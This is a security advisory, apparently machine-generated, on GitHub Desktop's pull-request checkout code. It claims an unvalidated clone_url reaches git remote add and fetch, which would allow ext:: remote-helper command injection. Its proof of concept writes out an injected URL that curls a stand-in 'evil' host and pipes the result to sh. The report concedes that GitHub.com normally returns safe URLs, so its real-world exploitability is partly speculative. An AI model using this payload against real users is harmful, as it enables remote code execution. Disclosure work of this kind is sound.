## Title
Unvalidated PR head `clone_url` from the GitHub API is passed directly to `git remote add` and then fetched, enabling transport-helper argument injection — (File: `app/src/lib/stores/app-store.ts`)

### Summary
The OtterSec report's root cause is that a value nobody vetted (an unprivileged actor's on-chain instruction argument) is trusted and fed straight into a sensitive operation without validating it first, corrupting the state the victim relies on. The closest analog in GitHub Desktop is the pull-request-checkout flow: the `clone_url` of a pull request's *head* repository — a field sourced from a GitHub API response describing a fork that is not controlled by the repository owner — is passed unvalidated into `git remote add` and then immediately fetched, with no protocol allow-list anywhere in the remote/fetch path.

### Finding Description
When a user checks out a pull request (including via the `x-github-client://openRepo` deep link handled by `openPullRequestFromUrl`), Desktop calls `_findPullRequestBranch` with `pullRequest.head.repo.clone_url` taken straight from the API/deep-link payload: [1](#0-0) 

That URL is used, unvalidated, to add a new git remote: [2](#0-1) 

and `addRemote` forwards it verbatim to the git CLI: [3](#0-2) 

Immediately afterward, Desktop fetches that same remote automatically to resolve the PR branch: [4](#0-3) 

Nowhere in this path is the URL's transport/scheme checked against an allow-list. `envForRemoteOperation`/`envForProxy` only inspect the URL to decide whether to *set an HTTP(S) proxy variable*; any other scheme (e.g. `ext::`, `fd::`, or `ssh://` with option-like hostnames) passes through untouched: [5](#0-4) 

A search of the codebase confirms there is no `GIT_ALLOW_PROTOCOL` restriction or explicit scheme allow-list applied before `git remote add`/`fetch` are invoked with API/deep-link-derived URLs.

The `head.repo.clone_url` field in the GitHub REST/GraphQL PR payload is exactly the kind of "GitHub API object" the task calls out as attacker-influenceable: it reflects the state of the *fork* repository, and — more importantly for GitHub Enterprise or any MITM'd/compromised API response — is not cryptographically bound to a known-good host or scheme the client itself enforces. `git`'s remote-helper mechanism (`ext::<command>`, `fd::`) treats a URL as an instruction to invoke an arbitrary local helper program, so a URL whose scheme is `ext::` executed by `git fetch` results in command execution in the Electron main process's git-invoking context, not merely a network fetch.

### Impact Explanation
If a crafted `clone_url` reaches `addRemote` + fetch, the outcome is:
- Arbitrary command execution outside of any git protocol sandbox (via `ext::`/`fd::` remote helpers), running with the privileges of the Desktop process.
- Silent corruption of the repository's remote configuration (an extra `github-desktop-*` remote is added pointing to attacker infrastructure), which can persist and be reused by later fetch/pull/push operations, corrupting what the user believes they are pushing/pulling.

This matches the report's "Valid Impact" criteria: attacker controls a GitHub API object and the git remote/response, and the result can be code execution or silent corruption of git operations — without requiring local access, admin rights, or prior malware.

### Likelihood Explanation
Reaching `_findPullRequestBranch` requires the victim to check out (or the deep link to trigger checkout of) a pull request whose head repository is attacker-controlled — an attacker can always open a PR from their own fork against a public repo the victim has cloned in Desktop, or lure the victim into the `x-github-client://openRepo/...?pr=N` deep link, which does not require the PR to be merged or even reviewed. The remaining question is whether GitHub.com's API itself would ever emit a non-`https`/`git@` `clone_url`; on GitHub.com this is server-controlled and normally safe, but Desktop also supports GitHub Enterprise Server endpoints and PAC/proxy-based network interception, where the `clone_url` field is not defended by Desktop's own code — the client performs no validation of its own regardless of the trustworthiness of the upstream server, meaning the security guarantee currently rests entirely outside Desktop's control.

### Recommendation
Before calling `addRemote`/`git remote add` (and before any subsequent `fetch`) with a URL sourced from a GitHub API response or a deep link, validate that the URL scheme is restricted to an explicit allow-list (`https`, `ssh`, `git`) and reject `ext::`, `fd::`, `file://`, or any URL that isn't a well-formed host-based remote. Apply the same validation used for user-typed clone URLs (`parseRemote`/`remoteRegexes` in `app/src/lib/remote-parsing.ts`) to API- and deep-link-derived URLs, rather than trusting them implicitly because they came from "the API."

### Proof of Concept
1. Attacker forks the victim's public repository (or crafts a malicious PR payload if targeting a GHES instance/MITM proxy) such that the pull request's `head.repo.clone_url` is `ext::sh -c "curl http://evil/x|sh"`.
2. Attacker sends the victim a link of the form `x-github-client://openRepo/https://github.com/victim/repo?pr=123` or otherwise gets the victim to check out the PR in Desktop.
3. `openPullRequestFromUrl` → `_checkoutPullRequest` → `_findPullRequestBranch` executes `addRemote(repository, forkRemoteName, headCloneUrl)` followed by `_fetchRemote`, both of which pass the crafted `ext::` URL straight to `git`, causing git to invoke the attacker's shell command as a remote helper.
